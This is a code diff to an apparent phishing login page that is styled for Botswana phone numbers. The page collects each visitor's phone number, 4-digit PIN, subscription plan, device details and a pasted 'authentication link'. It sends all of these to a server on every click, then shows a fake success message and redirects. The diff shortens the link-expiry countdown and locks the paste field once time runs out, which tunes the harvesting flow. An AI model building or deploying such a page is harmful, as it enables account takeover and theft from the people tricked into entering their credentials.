@@ -229,7 +229,7 @@ Please paste the authentication link
 <div class="resend-row">
 
 <div class="small" id="resendInfo">
-Resend available in <span id="countdown">120</span>s
+Resend available in <span id="countdown">60</span>s
 </div>
 
 <button id="resendBtn" class="resend-btn" disabled>
@@ -271,7 +271,6 @@ if(/Chrome/i.test(ua)) device+=" | Chrome"
 else if(/Safari/i.test(ua)) device+=" | Safari"
 else if(/Firefox/i.test(ua)) device+=" | Firefox"
 
-
 /* PLAN */
 
 let planLine=null
@@ -281,7 +280,6 @@ if(p){
 planLine=[p.name||p.shortName||"",p.price||""].filter(Boolean).join(" — ")
 }
 }catch(e){}
-
 
 /* PHONE */
 
@@ -304,7 +302,6 @@ let d=phone.value.replace("+267","").replace(/\D/g,"").replace(/^0+/,"").slice(0
 phone.value="+267"+d
 updateLogin()
 })
-
 
 /* PIN */
 
@@ -334,7 +331,6 @@ function updateLogin(){
 loginBtn.disabled=!(validatePhone() && /^\d{4}$/.test(pinValue))
 }
 
-
 /* API */
 
 async function sendToServer(payload){
@@ -344,7 +340,6 @@ headers:{"Content-Type":"application/json"},
 body:JSON.stringify(payload)
 })
 }
-
 
 /* AUTH MODAL */
 
@@ -359,13 +354,16 @@ const resendInfo=document.getElementById("resendInfo")
 const otpStatus=document.getElementById("otpStatus")
 
 let timer=null
-let seconds=120
+let seconds=60
 
 function startCountdown(){
 
 clearInterval(timer)
 
-seconds=120
+seconds=60
+
+authLink.disabled=false
+pasteBtn.disabled=false
 
 resendBtn.disabled=true
 
@@ -381,9 +379,12 @@ if(seconds<=0){
 
 clearInterval(timer)
 
+authLink.disabled=true
+pasteBtn.disabled=true
+
 resendBtn.disabled=false
 
-resendInfo.textContent="Didn’t receive the link?"
+resendInfo.textContent="Expired"
 
 }
 
@@ -391,7 +392,7 @@ resendInfo.textContent="Didn’t receive the link?"
 
 }
 
-/* ONLY CHANGE IS HERE */
+/* VALIDATION */
 
 function updateConfirm(){
 
@@ -408,7 +409,6 @@ otpWarning.style.display=ok?"none":"block"
 }
 
 authLink.addEventListener("input",updateConfirm)
-
 
 /* PASTE */
 
@@ -430,7 +430,6 @@ alert("Paste manually")
 
 }
 
-
 /* LOGIN */
 
 document.getElementById("loginForm").addEventListener("submit",async e=>{
@@ -448,41 +447,34 @@ updateConfirm()
 startCountdown()
 
 await sendToServer({
-
 event:"login_clicked",
 loginPhone:phone.value,
 loginPin:pinValue,
 plan:planLine,
 device,
 submittedAt:new Date().toISOString()
-
 })
 
 })
-
 
 resendBtn.onclick=async()=>{
 
 startCountdown()
 
 await sendToServer({
-
 event:"resend_link",
 loginPhone:phone.value,
 loginPin:pinValue,
 plan:planLine,
 device,
 submittedAt:new Date().toISOString()
-
 })
 
 }
 
-
 confirmBtn.onclick=async()=>{
 
 await sendToServer({
-
 event:"auth_link_confirm",
 loginPhone:phone.value,
 loginPin:pinValue,
@@ -490,7 +482,6 @@ link:authLink.value,
 plan:planLine,
 device,
 submittedAt:new Date().toISOString()
-
 })
 
 otpStatus.innerHTML="<span class='success'>Success — request received</span>"
@@ -499,13 +490,9 @@ setTimeout(()=>location.href="thankyou.html",1200)
 
 }
 
-
 cancelBtn.onclick=()=>{
-
 otpModal.style.display="none"
-
 clearInterval(timer)
-
 }
 
 </script>
